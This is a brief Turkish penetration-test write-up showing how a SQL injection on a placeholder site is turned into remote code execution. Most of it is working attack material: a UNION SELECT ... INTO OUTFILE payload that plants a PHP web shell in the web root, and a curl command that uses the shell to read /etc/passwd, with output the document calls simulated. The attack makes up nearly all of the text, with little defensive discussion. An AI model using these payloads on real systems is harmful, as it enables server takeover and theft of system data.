# Sızma Testi Projesi: SQL Injection to RCE Pipeline
---

## GİRİŞ VE HEDEF
Bu çalışmada, hedef web uygulamasındaki bir SQL Injection zafiyeti kullanılarak sunucu üzerinde bir arka kapı (Web Shell) oluşturulmuş ve bu sayede veritabanı zafiyeti, işletim sisteminde doğrudan komut çalıştırabilme (Remote Code Execution - RCE) noktasına evrilmiştir.


**Kullanılan SQL Enjeksiyonu ve Payload:**
```sql
[https://hedef-site.com/ara.php?id=-1](https://hedef-site.com/ara.php?id=-1)' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3 INTO OUTFILE '/var/www/html/kabuk.php'-- -

> **Açıklama:** Bu işlemle birlikte sunucunun `/var/www/html/` dizini altına dışarıdan gönderilen `cmd` parametresindeki işletim sistemi komutlarını çalıştıracak `kabuk.php` adında bir dosya yazdırılmıştır.

---


**Uygulanan İstismar Komutu (Simüle Edilen Terminal Çıktısı):**
```bash
mltme@kali:~$ curl "[https://hedef-site.com/kabuk.php?cmd=cat%20/etc/passwd](https://hedef-site.com/kabuk.php?cmd=cat%20/etc/passwd)"

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
dbadmin:x:1001:1001:Database Admin:/home/dbadmin:/bin/bash
